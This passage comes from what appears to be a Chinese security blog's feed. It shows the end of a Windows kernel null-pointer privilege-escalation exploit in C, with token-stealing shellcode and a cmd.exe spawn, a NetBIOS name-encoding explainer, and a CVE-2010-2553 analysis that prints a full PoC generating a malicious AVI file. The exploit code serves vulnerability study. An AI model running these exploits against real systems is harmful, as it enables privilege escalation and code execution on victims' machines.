class="line">        mov edx, addr_kifastsystemcall;</div><div class="line">        call edx;</div><div class="line">        add esp, <span class="number">0x0c</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">Trigger_BSoDPoc</span><span class="params">()</span> </span>&#123;</div><div class="line">    HBITMAP hBitmap1 = (HBITMAP)demo_CreateBitmapIndirect();</div><div class="line">    HBITMAP hBitmap2 = (HBITMAP)NtGdiSetBitmapAttributes((HBITMAP)hBitmap1, (DWORD)<span class="number">0x8f9</span>);</div><div class="line"></div><div class="line">    RECT rect = &#123; <span class="number">0</span> &#125;;</div><div class="line">    rect.left = <span class="number">0x368c</span>;</div><div class="line">    rect.top = <span class="number">0x400000</span>;</div><div class="line">    HRGN hRgn = (HRGN)CreateRectRgnIndirect(&amp;rect);</div><div class="line"></div><div class="line">    HDC hdc = (HDC)CreateCompatibleDC((HDC)<span class="number">0x0</span>);</div><div class="line">    SelectObject((HDC)hdc, (HGDIOBJ)hBitmap2);</div><div class="line"></div><div class="line">    HBRUSH hBrush = (HBRUSH)CreateSolidBrush((COLORREF)<span class="number">0x00edfc13</span>);</div><div class="line"></div><div class="line">    FillRgn((HDC)hdc, (HRGN)hRgn, (HBRUSH)hBrush);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[])</div><div class="line">&#123;</div><div class="line">    PVOID base = (PVOID)<span class="number">0x1</span>;</div><div class="line">    SIZE_T size = <span class="number">0x1000</span>;</div><div class="line"></div><div class="line">    FARPROC addr = GetProcAddress(GetModuleHandle(<span class="string">"ntdll.dll"</span>),<span class="string">"NtAllocateVirtualMemory"</span>);</div><div class="line">    pNtAllocateVirtualMemory NtAllocateVirtualMemory = (pNtAllocateVirtualMemory)addr;</div><div class="line"></div><div class="line">    NTSTATUS status = NtAllocateVirtualMemory(</div><div class="line">        GetCurrentProcess(),</div><div class="line">        &amp;base,</div><div class="line">        <span class="number">0</span>,</div><div class="line">        &amp;size,</div><div class="line">        MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN,</div><div class="line">        PAGE_EXECUTE_READWRITE</div><div class="line">        );</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (status != <span class="number">0</span>)</div><div class="line">    &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"[*]can not allocate null page"</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">memset</span>(<span class="number">0x0</span>, <span class="number">0</span>, <span class="number">0x1000</span>);</div><div class="line"></div><div class="line">    <span class="keyword">void</span>* bypass_one = (<span class="keyword">void</span> *)<span class="number">0x590</span>;</div><div class="line">    *(LPBYTE)bypass_one = <span class="number">0x1</span>;</div><div class="line">    <span class="keyword">void</span>* bypass_two = (<span class="keyword">void</span> *)<span class="number">0x592</span>;</div><div class="line">    *(LPBYTE)bypass_two = <span class="number">0x1</span>;</div><div class="line">    <span class="keyword">void</span>* jump_addr = (<span class="keyword">void</span> *)<span class="number">0x748</span>;</div><div class="line">    *(LPDWORD)jump_addr = (DWORD)TokenStealingShellcodeWin7;</div><div class="line"></div><div class="line">    Trigger_BSoDPoc();</div><div class="line">    system(<span class="string">"cmd.exe"</span>);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>一定要注意，<code>token-steal shellcode</code>这个函数一定要有四个参数，以为<code>call edi</code>的时候传入了四个参数，如果不写参数会导致堆栈不平衡造成<code>BSoD</code>（如果在shellcode中平衡堆栈也可以）。</p>
<p>执行结果</p>
<p><img src="3.png" alt=""></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://blog.nsfocus.net/null-pointer-vulnerability-defense/" target="_blank" rel="external">http://blog.nsfocus.net/null-pointer-vulnerability-defense/</a><br><a href="https://www.whitehatters.academy/intro-to-windows-kernel-exploitation-3-my-first-driver-exploit/" target="_blank" rel="external">https://www.whitehatters.academy/intro-to-windows-kernel-exploitation-3-my-first-driver-exploit/</a><br><a href="http://blog.csdn.net/one_in_one/article/details/51766912" target="_blank" rel="external">http://blog.csdn.net/one_in_one/article/details/51766912</a><br><a href="https://whereisk0shl.top/ssctf_pwn450_windows_kernel_exploitation_writeup.html" target="_blank" rel="external">https://whereisk0shl.top/ssctf_pwn450_windows_kernel_exploitation_writeup.html</a><br><a href="https://github.com/k0keoyo/SSCTF-pwn450-ms16-034-writeup" target="_blank" rel="external">https://github.com/k0keoyo/SSCTF-pwn450-ms16-034-writeup</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;利用Vmware进行双机调试&quot;&gt;&lt;a href=&quot;#利用Vmware进行双机调试&quot; class=&quot;headerlink&quot; title=&quot;利用Vmware进行双机调试&quot;&gt;&lt;/a&gt;利用Vmware进行双机调试&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;使用管理员模式运行cmd&lt;/li
    
    </summary>
    
      <category term="技术" scheme="http://weaponx.site/categories/tech/"/>
    
    
      <category term="安全" scheme="http://weaponx.site/tags/%E5%AE%89%E5%85%A8/"/>
    
      <category term="漏洞分析" scheme="http://weaponx.site/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2017-9073 EsteemAudit分析[翻译自趋势科技]</title>
    <link href="http://weaponx.site/2017/07/13/CVE-2017-9073-EsteemAudit%E5%88%86%E6%9E%90-%E7%BF%BB%E8%AF%91%E8%87%AA%E8%B6%8B%E5%8A%BF%E7%A7%91%E6%8A%80/"/>
    <id>http://weaponx.site/2017/07/13/CVE-2017-9073-EsteemAudit分析-翻译自趋势科技/</id>
    <published>2017-07-13T05:40:32.000Z</published>
    <updated>2017-07-13T05:41:35.901Z</updated>
    
    <content type="html"><![CDATA[<p>文章已经投稿至360播报。</p>
<p><a href="http://bobao.360.cn/learning/detail/3937.html" target="_blank" rel="external">http://bobao.360.cn/learning/detail/3937.html</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;文章已经投稿至360播报。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://bobao.360.cn/learning/detail/3937.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://bobao.360.cn/learning/
    
    </summary>
    
      <category term="安全" scheme="http://weaponx.site/categories/%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="漏洞" scheme="http://weaponx.site/tags/%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>NETBIOS主机名编码算法</title>
    <link href="http://weaponx.site/2017/06/07/NETBIOS%E4%B8%BB%E6%9C%BA%E5%90%8D%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95/"/>
    <id>http://weaponx.site/2017/06/07/NETBIOS主机名编码算法/</id>
    <published>2017-06-07T10:03:55.000Z</published>
    <updated>2017-06-07T10:16:05.390Z</updated>
    
    <content type="html"><![CDATA[<p>最近在看SMB协议，在自己构造数据包的时候发现了一个问题。</p>
<a id="more"></a>
<p><img src="1.png" alt=""></p>
<p>经过查阅资料发现NETBIOS对主机名的编码方式如下：</p>
<p>1.将字符补齐到16字节，不够的用空格补<br>2.将每个字符拆成高4bit和低4bit<br>3.再用0x41就是A加上这个值</p>
<p>举个例子<code>abcd</code>的编码流程：<br>1.补空格到16字节</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="string">"abcd                "</span></div></pre></td></tr></table></figure>
<p>2.将每个字符拆开</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><div class="line">拆分前</div><div class="line"><span class="number">0x61</span> <span class="number">0x62</span> <span class="number">0x63</span> <span class="number">0x64</span> <span class="number">0x20</span> <span class="number">0x20</span> <span class="number">0x20</span> <span class="number">0x20</span> <span class="number">0x20</span> ...</div><div class="line"></div><div class="line">拆分后</div><div class="line"><span class="number">0x6</span> <span class="number">0x1</span> <span class="number">0x6</span> <span class="number">0x2</span> <span class="number">0x6</span> <span class="number">0x3</span> <span class="number">0x6</span> <span class="number">0x4</span> <span class="number">0x2</span> <span class="number">0x0</span> <span class="number">0x2</span> <span class="number">0x0</span></div></pre></td></tr></table></figure>
<p>3.用0x41加上这个值</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><div class="line"><span class="number">0x47</span> <span class="number">0x42</span> <span class="number">0x47</span> <span class="number">0x43</span> <span class="number">0x47</span> <span class="number">0x44</span> <span class="number">0x47</span> <span class="number">0x45</span> <span class="number">0x43</span> <span class="number">0x41</span> ...</div><div class="line"></div><div class="line">GBGCGDGECA</div></pre></td></tr></table></figure>
<p>自己用python实现了一下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span><span class="params">(src)</span>:</span></div><div class="line">    src = src.ljust(<span class="number">16</span>,<span class="string">"\x20"</span>)</div><div class="line">    names = []</div><div class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> src:</div><div class="line">        char_ord = ord(c)</div><div class="line">        high_4_bits = char_ord &gt;&gt; <span class="number">4</span></div><div class="line">        low_4_bits = char_ord &amp; <span class="number">0x0f</span></div><div class="line">        names.append(high_4_bits)</div><div class="line">        names.append(low_4_bits)</div><div class="line">    </div><div class="line">    res = <span class="string">""</span></div><div class="line">    <span class="keyword">for</span> name <span class="keyword">in</span> names:</div><div class="line">        res += chr(<span class="number">0x41</span>+name)</div><div class="line">    <span class="keyword">return</span> res</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近在看SMB协议，在自己构造数据包的时候发现了一个问题。&lt;/p&gt;
    
    </summary>
    
      <category term="技术" scheme="http://weaponx.site/categories/tech/"/>
    
    
      <category term="安全" scheme="http://weaponx.site/tags/%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2010-2553分析[漏洞战争]</title>
    <link href="http://weaponx.site/2017/05/23/CVE-2010-2553%E5%88%86%E6%9E%90-%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89/"/>
    <id>http://weaponx.site/2017/05/23/CVE-2010-2553分析-漏洞战争/</id>
    <published>2017-05-24T01:31:40.000Z</published>
    <updated>2017-05-24T01:34:45.984Z</updated>
    
    <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>CVE 2010-2553漏洞，也称为MicrosoftWindows Cinepak 编码解码器解压缩漏洞，影响的操作系统版本有：Microsoft Windows XP SP2和SP3，WindowsVista SP1和SP2，以及Windows 7。</p>
<p>漏洞原因在于Cinepak 编码解码器对媒体文件解压缩时代码控制不恰当，可导致远程代码执行。如果用户打开特制的媒体文件，此漏洞可能允许执行代码。如果用户使用管理用户权限登录，成功利用此漏洞的攻击者便可完全控制受影响的系统。</p>
<p>漏洞利用wmplay.exe，而wmplay.exe这个播放器在国内很少有人使用，如果被攻击者使用了第三方的视频播放软件，很难攻击成功，这可能也是这一漏洞不被分析重视的一大原因。</p>
<a id="more"></a>
<p>在exploit-db找到老外的poc</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="string">'''</span></div><div class="line"></div><div class="line">  __  __  ____         _    _ ____  </div><div class="line"> |  \/  |/ __ \   /\  | |  | |  _ \</div><div class="line"> | \  / | |  | | /  \ | |  | | |_) |</div><div class="line"> | |\/| | |  | |/ /\ \| |  | |  _ &lt;</div><div class="line"> | |  | | |__| / ____ \ |__| | |_) |</div><div class="line"> |_|  |_|\____/_/    \_\____/|____/</div><div class="line"></div><div class="line">http://www.exploit-db.com/moaub-26-microsoft-cinepak-codec-cvdecompress-heap-overflow-ms10-055/</div><div class="line"></div><div class="line">'''</div><div class="line"></div><div class="line"><span class="string">'''</span></div><div class="line">  Title             : Microsoft Cinepak Codec CVDecompress Heap Overflow</div><div class="line">  Version           : iccvid.dll XP SP3</div><div class="line">  Analysis          : http://www.abysssec.com</div><div class="line">  Vendor            : http://www.microsoft.com</div><div class="line">  Impact            : High</div><div class="line">  Contact           : shahin [at] abysssec.com , info  [at] abysssec.com</div><div class="line">  Twitter           : @abysssec</div><div class="line">  CVE               : CVE-2010-2553</div><div class="line">  MOAUB Number      :</div><div class="line">'''</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">import</span> sys</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line"></div><div class="line">    aviHeaders = <span class="string">'\x52\x49\x46\x46\x58\x01\x00\x00\x41\x56\x49\x20\x4C\x49\x53\x54\xC8\x00\x00\x00\x68\x64\x72\x6C\x61\x76\x69\x68\x38\x00\x00\x00\xA0\x86\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x01\x00\x00\x4E\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x60\x01\x00\x00\x20\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x4C\x49\x53\x54\x7C\x00\x00\x00\x73\x74\x72\x6C\x73\x74\x72\x68\x38\x00\x00\x00\x76\x69\x64\x73\x63\x76\x69\x64\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xE8\x03\x00\x00\x10\x27\x00\x00\x00\x00\x00\x00\x4E\x00\x00\x00\x20\x74\x00\x00\xFF\xFF\xFF\xFF\x00\x00\x00\x00\x00\x00\x00\x00\x60\x01\x20\x01\x73\x74\x72\x66\x28\x00\x00\x00\x28\x00\x00\x00\x50\x01\x00\x00\x20\x01\x00\x00\x01\x00\x18\x00\x63\x76\x69\x64\x84\x8D\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'</span></div><div class="line">    padding = <span class="string">'\x4A\x55\x4E\x4B\x00\x00\x00\x00\x4A\x55\x4E\x4B\x00\x00\x00\x00'</span></div><div class="line">    movi_tag = <span class="string">'\x4C\x49\x53\x54\x5C\x00\x00\x00\x6D\x6F\x76\x69\x30\x30\x64\x63\x10\x00\x00\x00'</span></div><div class="line">    cinepak_codec_data1 = <span class="string">'\x00\x00\x00\x68\x01\x60\x01\x20'</span></div><div class="line">    number_of_coded_strips = <span class="string">'\x00\x10'</span></div><div class="line">    cinepak_codec_data2 = <span class="string">'\x10\x00\x00\x10\x00\x00\x00\x00\x00\x60\x01\x60\x20\x00\x00\x00\x11\x00\x00\x10\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x11\x00\x00\x10\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x11\x00\x00\x10\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x11\x00\x00\x10\x41\x00'</span></div><div class="line">    idx_tag = <span class="string">'\x69\x64\x78\x31\x10\x00\x00\x00\x30\x30\x64\x63\x10\x00\x00\x00\x04\x00\x00\x00\x68\x00\x00\x00'</span></div><div class="line"></div><div class="line">    avifile = open(<span class="string">'poc.avi'</span>, <span class="string">'wb+'</span>)</div><div class="line">    avifile.write(aviHeaders)</div><div class="line">    avifile.write(padding)</div><div class="line">    avifile.write(movi_tag)</div><div class="line">    avifile.write(cinepak_codec_data1)</div><div class="line">    avifile.write(number_of_coded_strips)</div><div class="line">    avifile.write(cinepak_codec_data2)</div><div class="line">    avifile.write(idx_tag)</div><div class="line"></div><div class="line">    avifile.close()</div><div class="line">    <span class="keyword">print</span> <span class="string">'[-] AVI file generated'</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    main()</div></pre></td></tr></table></figure>
<p>生成poc.avi后用wmplayer打开，直接崩溃。附加上windbg打开</p>
<p><img src="1.png" alt=""></p>
<p>看起来是iccvid.dll中<code>iccvid!CVDecompress+0x11e</code>出现的漏洞。</p>
<p>因为是堆溢出，我们这里开启页堆<code>!gflag +hpa</code>，页堆的机制就是在堆的末尾增加一个栅格，属性是不可访问。如果发生了堆溢出则会访问栅格造成异常。</p>
<p><img src="2.png" alt=""></p>
<p>发现edi就是页堆，即发生了堆溢出。</p>
<p>看看目的堆edi有多大</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><div class="line"><span class="number">0</span><span class="symbol">:</span><span class="number">014</span>&gt; !heap -p -a edi</div><div class="line">    address <span class="number">075</span>e700<span class="number">0</span> found <span class="keyword">in</span></div><div class="line">    _DPH_HEAP_ROOT @ a100<span class="number">0</span></div><div class="line">    <span class="keyword">in</span> busy allocation (  <span class="symbol">DPH_HEAP_BLOCK:</span>         UserAddr         UserSize -         VirtAddr         VirtSize)</div><div class="line">                                 <span class="number">7</span><span class="symbol">b92c38:</span>          <span class="number">75</span>e500<span class="number">0</span>             <span class="number">6000</span> -          <span class="number">75</span>e400<span class="number">0</span>             <span class="number">8000</span></div><div class="line">    <span class="number">7</span>c938f01 ntdll!RtlAllocateHeap+<span class="number">0x00000e64</span></div><div class="line">    <span class="number">7</span>c809a6f kernel32!LocalAlloc+<span class="number">0x00000058</span></div><div class="line">    <span class="number">73</span>b724a8 iccvid!CVDecompressBegin+<span class="number">0x00000080</span></div><div class="line">    <span class="number">73</span>b7c6a<span class="number">0</span> iccvid!DecompressBegin+<span class="number">0x00000214</span></div><div class="line">    <span class="number">73</span>b766a1 iccvid!DriverProc+<span class="number">0x00000198</span></div><div class="line">    <span class="number">73</span>b41938 MSVFW32!ICSendMessage+<span class="number">0x0000002b</span></div><div class="line">    <span class="number">7</span>cf8df19 quartz!<span class="symbol">CAVIDec:</span><span class="symbol">:StartStreaming+</span><span class="number">0x00000278</span></div><div class="line">    <span class="number">7</span>cf8d164 quartz!<span class="symbol">CTransformFilter:</span><span class="symbol">:Pause+</span><span class="number">0x00000060</span></div><div class="line">    <span class="number">7</span>cf8d0f2 quartz!<span class="symbol">CAVIDec:</span><span class="symbol">:Pause+</span><span class="number">0x0000002f</span></div><div class="line">    <span class="number">7</span>cf8cf69 quartz!<span class="symbol">CFilterGraph:</span><span class="symbol">:Pause+</span><span class="number">0x00000107</span></div><div class="line">    <span class="number">7</span>cf8ce93 quartz!<span class="symbol">CFGControl:</span><span class="symbol">:Cue+</span><span class="number">0x00000032</span></div><div class="line">    <span class="number">7</span>cfa4584 quartz!<span class="symbol">CFGControl:</span><span class="symbol">:CueThenRun+</span><span class="number">0x00000012</span></div><div class="line">    <span class="number">7</span>cfa44d7 quartz!<span class="symbol">CFGControl:</span><span class="symbol">:CImplMediaControl</span><span class="symbol">:</span><span class="symbol">:Run+</span><span class="number">0x0000002b</span></div><div class="line">    <span class="number">491</span>be351 wmp!<span class="symbol">CWMPGraph:</span><span class="symbol">:InternalPlay+</span><span class="number">0x00000039</span></div><div class="line">    <span class="number">491</span>be30<span class="number">0</span> wmp!<span class="symbol">CWMPGraph:</span><span class="symbol">:Play+</span><span class="number">0x000000a8</span></div><div class="line">    <span class="number">4917</span>ff31 wmp!<span class="symbol">CWMPControl:</span><span class="symbol">:InternalPlay+</span><span class="number">0x0000015c</span></div></pre></td></tr></table></figure>
<p>可以看出这个堆有0x6000，此时ecx=0x800，所以每次复制0x800 * 4 = 0x2000个字节。然后我们看看这个函数的伪代码。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="keyword">do</span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">if</span> ( v29 &lt; <span class="number">0x16</span> )</div><div class="line">    <span class="keyword">break</span>;</div><div class="line">  HIBYTE(v15) = *(_BYTE *)(v14 + <span class="number">1</span>);</div><div class="line">  LOBYTE(v15) = *(_BYTE *)(v14 + <span class="number">2</span>);</div><div class="line">  v31 = *(_BYTE *)(v14 + <span class="number">3</span>) | (v15 &lt;&lt; <span class="number">8</span>);</div><div class="line">  <span class="keyword">if</span> ( v29 &lt; v31 )</div><div class="line">    <span class="keyword">break</span>;</div><div class="line">  <span class="keyword">if</span> ( *(_BYTE *)v14 == <span class="number">16</span> || *(_BYTE *)v14 == <span class="number">17</span> )</div><div class="line">  &#123;</div><div class="line">    <span class="keyword">if</span> ( ULongSub(v31, <span class="number">12</span>, &amp;a1) &lt; <span class="number">0</span> )</div><div class="line">      <span class="keyword">goto</span> LABEL_33;</div><div class="line">    HIBYTE(v16) = *(_BYTE *)(v14 + <span class="number">8</span>);</div><div class="line">    HIBYTE(v17) = *(_BYTE *)(v14 + <span class="number">4</span>);</div><div class="line">    LOBYTE(v16) = *(_BYTE *)(v14 + <span class="number">9</span>);</div><div class="line">    LOBYTE(v17) = *(_BYTE *)(v14 + <span class="number">5</span>);</div><div class="line">    v18 = v16 - v17;</div><div class="line">    LOWORD(v18) = *(_WORD *)(v7 + <span class="number">46</span>) * v18;</div><div class="line">    a2 = v18;</div><div class="line">    <span class="keyword">if</span> ( v32 &amp;&amp; !BYTE3(TotalLen) &amp;&amp; *(_BYTE *)v14 == <span class="number">17</span> )</div><div class="line">    &#123;</div><div class="line">      qmemcpy(</div><div class="line">        (<span class="keyword">void</span> *)(*(_DWORD *)(v7 + <span class="number">28</span>) + v32),</div><div class="line">        (<span class="keyword">const</span> <span class="keyword">void</span> *)(*(_DWORD *)(v7 + <span class="number">28</span>) + v32 - <span class="number">0x2000</span>),</div><div class="line">        <span class="number">0x2000</span>u);  <span class="comment">// vuln here</span></div><div class="line">      v14 = v26;</div><div class="line">    &#125;</div><div class="line">    v19 = v30 + <span class="number">12</span>;</div><div class="line">    v20 = v14 + <span class="number">12</span>;</div><div class="line">    *(_DWORD *)(v7 + <span class="number">56</span>) = v32 + *(_DWORD *)(v7 + <span class="number">32</span>);</div><div class="line">    v27 = v14 + <span class="number">12</span>;</div><div class="line">    *(_DWORD *)(v7 + <span class="number">60</span>) = a7;</div><div class="line">    <span class="keyword">while</span> ( a1 &gt;= <span class="number">4</span> )</div><div class="line">    &#123;</div><div class="line">      HIBYTE(v21) = *(_BYTE *)(v20 + <span class="number">1</span>);</div><div class="line">      LOBYTE(v21) = *(_BYTE *)(v20 + <span class="number">2</span>);</div><div class="line">      v22 = *(_BYTE *)(v20 + <span class="number">3</span>) | (v21 &lt;&lt; <span class="number">8</span>);</div><div class="line">      v24 = v22;</div><div class="line">      <span class="keyword">if</span> ( a1 &lt; v22 )</div><div class="line">        <span class="keyword">break</span>;</div><div class="line">      <span class="keyword">switch</span> ( *(_BYTE *)v20 )</div><div class="line">      &#123;</div><div class="line">        <span class="keyword">case</span> <span class="number">0x20</span>:</div><div class="line">        <span class="keyword">case</span> <span class="number">0x21</span>:</div><div class="line">        <span class="keyword">case</span> <span class="number">0x24</span>:</div><div class="line">        <span class="keyword">case</span> <span class="number">0x25</span>:</div><div class="line">          (*(<span class="keyword">void</span> (__stdcall **)(<span class="keyword">int</span>, _DWORD, _DWORD, _DWORD))v7)(</div><div class="line">            v19,</div><div class="line">            *(_DWORD *)(v7 + <span class="number">56</span>),</div><div class="line">            *(_DWORD *)(v7 + <span class="number">52</span>),</div><div class="line">            *(_DWORD *)(v7 + <span class="number">48</span>));</div><div class="line">          <span class="keyword">break</span>;</div><div class="line">        <span class="keyword">case</span> <span class="number">0x22</span>:</div><div class="line">        <span class="keyword">case</span> <span class="number">0x23</span>:</div><div class="line">        <span class="keyword">case</span> <span class="number">0x26</span>:</div><div class="line">        <span class="keyword">case</span> <span class="number">0x27</span>:</div><div class="line">          (*(<span class="keyword">void</span> (__stdcall **)(<span class="keyword">int</span>, <span class="keyword">int</span>, _DWORD, _DWORD))(v7 + <span class="number">4</span>))(</div><div class="line">            v19,</div><div class="line">            *(_DWORD *)(v7 + <span class="number">56</span>) + <span class="number">4096</span>,</div><div class="line">            *(_DWORD *)(v7 + <span class="number">52</span>),</div><div class="line">            *(_DWORD *)(v7 + <span class="number">48</span>));</div><div class="line">          <span class="keyword">break</span>;</div><div class="line">        <span class="keyword">case</span> <span class="number">0x30</span>:</div><div class="line">          (*(<span class="keyword">void</span> (__stdcall **)(<span class="keyword">unsigned</span> <span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">int</span>))(v7 + <span class="number">8</span>))(</div><div class="line">            v7,</div><div class="line">            v19 + <span class="number">4</span>,</div><div class="line">            v22 - <span class="number">4</span>,</div><div class="line">            a4,</div><div class="line">            a5,</div><div class="line">            a6,</div><div class="line">            a2);</div><div class="line">          <span class="keyword">break</span>;</div><div class="line">        <span class="keyword">case</span> <span class="number">0x31</span>:</div><div class="line">          (*(<span class="keyword">void</span> (__stdcall **)(<span class="keyword">unsigned</span> <span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">int</span>))(v7 + <span class="number">16</span>))(</div><div class="line">            v7,</div><div class="line">            v19 + <span class="number">4</span>,</div><div class="line">            v22 - <span class="number">4</span>,</div><div class="line">            a4,</div><div class="line">            a5,</div><div class="line">            a6,</div><div class="line">            a2);</div><div class="line">          <span class="keyword">break</span>;</div><div class="line">        <span class="keyword">case</span> <span class="number">0x32</span>:</div><div class="line">          (*(<span class="keyword">void</span> (__stdcall **)(<span class="keyword">unsigned</span> <span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">int</span>))(v7 + <span class="number">12</span>))(</div><div class="line">            v7,</div><div class="line">            v19 + <span class="number">4</span>,</div><div class="line">            v22 - <span class="number">4</span>,</div><div class="line">            a4,</div><div class="line">            a5,</div><div class="line">            a6,</div><div class="line">            a2);</div><div class="line">          <span class="keyword">break</span>;</div><div class="line">        <span class="keyword">default</span>:</div><div class="line">          <span class="keyword">break</span>;</div><div class="line">      &#125;</div><div class="line">      v20 = v24 + v27;</div><div class="line">      v23 = <span class="number">1</span>;</div><div class="line">      v19 += v24;</div><div class="line">      v27 += v24;</div><div class="line">      <span class="keyword">if</span> ( v24 &gt; <span class="number">1</span> )</div><div class="line">        v23 = v24;</div><div class="line">      a1 -= v23;</div><div class="line">    &#125;</div><div class="line">    a6 += a7 * (<span class="keyword">signed</span> __int16)a2;</div><div class="line">    ++idx;</div><div class="line">    v32 += <span class="number">0x2000</span>;</div><div class="line">  &#125;</div><div class="line">  v30 += v31;</div><div class="line">  v29 -= v31;</div><div class="line">  v14 += v31;</div><div class="line">  v26 = v14;</div><div class="line">&#125;</div><div class="line"><span class="keyword">while</span> ( idx &lt; CodedStripNum );</div></pre></td></tr></table></figure>
<p>可以看出，每次循环后，会将edi的地址增加0x2000，注意v32这个变量，第一次其实并没有复制，因为第一次v32为0，也就是说qmemcpy复制两次就会导致堆溢出。</p>
<p>分析一下PoC，根据CVID格式分析(<a href="https://multimedia.cx/mirror/cinepak.txt" target="_blank" rel="external">https://multimedia.cx/mirror/cinepak.txt</a>)</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><div class="line">flag = <span class="number">0x00</span></div><div class="line">cvid长度 = <span class="number">0x000068</span></div><div class="line">coded frame宽度 = <span class="number">0x1060</span></div><div class="line">coded frame高度 = <span class="number">0x1020</span></div><div class="line">coded strip数量 = <span class="number">0x0010</span></div></pre></td></tr></table></figure>
<p>可以看出coded strip数量应该是小于3即可防止多次拷贝导致堆溢出。</p>
<h2 id="patchdiff"><a href="#patchdiff" class="headerlink" title="patchdiff"></a>patchdiff</h2><p><img src="3.png" alt=""></p>
<p>patchdiff下发现pathc了这个函数，看看patch在哪</p>
<p><img src="4.png" alt=""></p>
<p>可以看出，对比了coded strip是否大于3，大于3则退出。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h2&gt;&lt;p&gt;CVE 2010-2553漏洞，也称为MicrosoftWindows Cinepak 编码解码器解压缩漏洞，影响的操作系统版本有：Microsoft Windows XP SP2和SP3，WindowsVista SP1和SP2，以及Windows 7。&lt;/p&gt;
&lt;p&gt;漏洞原因在于Cinepak 编码解码器对媒体文件解压缩时代码控制不恰当，可导致远程代码执行。如果用户打开特制的媒体文件，此漏洞可能允许执行代码。如果用户使用管理用户权限登录，成功利用此漏洞的攻击者便可完全控制受影响的系统。&lt;/p&gt;
&lt;p&gt;漏洞利用wmplay.exe，而wmplay.exe这个播放器在国内很少有人使用，如果被攻击者使用了第三方的视频播放软件，很难攻击成功，这可能也是这一漏洞不被分析重视的一大原因。&lt;/p&gt;
    
    </summary>
    
      <category term="安全" scheme="http://weaponx.site/categories/%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="安全" scheme="http://weaponx.site/tags/%E5%AE%89%E5%85%A8/"/>
    
      <category term="漏洞分析" scheme="http://weaponx.site/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>ISCC中pwn200 shell无法启动原因详解</title>
    <link href="http://weaponx.site/2017/05/19/ISCC%E4%B8%ADpwn200-shell%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8%E5%8E%9F%E5%9B%A0%E8%AF%A6%E8%A7%A3/"/>
    <id>http://weaponx.site/2017/05/19/ISCC中pwn200-shell无法启动原因详解/</id>
    <published>2017-05-19T09:17:24.000Z</published>
    <updated>2017-05-26T10:16:42.160Z</updated>
    
